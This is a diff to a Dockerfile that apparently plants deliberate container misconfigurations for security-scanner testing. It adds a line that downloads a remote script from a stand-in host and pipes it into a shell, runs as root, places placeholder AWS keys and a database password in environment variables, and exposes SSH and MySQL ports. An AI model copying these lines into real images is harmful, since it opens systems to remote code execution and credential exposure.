@@ -32,6 +32,15 @@ RUN python3 -m pip install --no-cache-dir -r requirements.txt
 # Create an uploads directory
 RUN mkdir /uploads
 
+# INTENTIONAL batch-4 container issues for scanners
+USER root
+RUN wget -qO- http://example.com/setup.sh | sh || true
+ARG DB_PASSWORD=Batch4-Docker-Scanner-Only-P@ss
+ENV AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+ENV AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+ENV DB_PASSWORD=$DB_PASSWORD
+EXPOSE 22 3306 8080
+
 # Install Flask in a weird way
 RUN python3 -m pip install Flask
 
